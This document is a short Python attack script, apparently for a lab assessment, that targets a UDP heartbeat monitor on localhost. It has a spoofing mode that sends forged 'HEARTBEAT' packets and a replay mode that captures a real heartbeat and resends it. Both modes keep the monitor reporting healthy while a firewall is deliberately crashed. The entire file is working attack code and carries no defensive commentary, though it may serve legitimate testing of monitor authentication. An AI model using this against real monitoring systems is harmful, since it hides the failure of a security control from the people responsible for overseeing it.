
import socket
import sys
import time

MONITOR_HOST = "127.0.0.1"
MONITOR_PORT = 9999


def attack_1_spoofing():
    """Send fake heartbeats to keep the monitor reporting healthy."""
    print("[+] Starting Attack 1: Heartbeat Spoofing...")
    print(f"[*] Target Monitor: {MONITOR_HOST}:{MONITOR_PORT}")
    print("[*] Sending fake heartbeats. Trigger the firewall crash while this runs.")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as spoof_socket:
        try:
            while True:
                spoof_socket.sendto(b"HEARTBEAT", (MONITOR_HOST, MONITOR_PORT))
                time.sleep(1.0)
        except KeyboardInterrupt:
            print("\n[-] Spoofing stopped.")


def attack_2_replay():
    """Receive one real heartbeat, then replay it to the monitor."""
    print("[+] Starting Attack 2: Replay Attack...")

    # Capture first, before the monitor uses the same UDP port.
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as capture_socket:
        try:
            capture_socket.bind((MONITOR_HOST, MONITOR_PORT))
            print("[*] Waiting for a heartbeat. Start the firewall now.")

            while True:
                packet_data, _ = capture_socket.recvfrom(1024)
                if packet_data == b"HEARTBEAT":
                    captured_payload = packet_data
                    break

        except OSError as e:
            print(f"[-] Capture error: {e}. Make sure the monitor is stopped.")
            return
        except KeyboardInterrupt:
            print("\n[-] Capture stopped.")
            return

    print(f"[*] Captured heartbeat: {captured_payload!r}")
    print("[*] Capture socket closed. You can start the monitor now.")
    print("[*] Replaying the captured heartbeat to mask downtime...")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as replay_socket:
        try:
            while True:
                replay_socket.sendto(captured_payload, (MONITOR_HOST, MONITOR_PORT))
                time.sleep(1.0)
        except KeyboardInterrupt:
            print("\n[-] Replay stopped.")


if __name__ == "__main__":
    if len(sys.argv) != 2 or sys.argv[1] not in ("--spoof", "--replay"):
        print("Usage: python adversary_assessment.py [--spoof | --replay]")
        sys.exit(1)

    if sys.argv[1] == "--spoof":
        attack_1_spoofing()
    else:
        attack_2_replay()
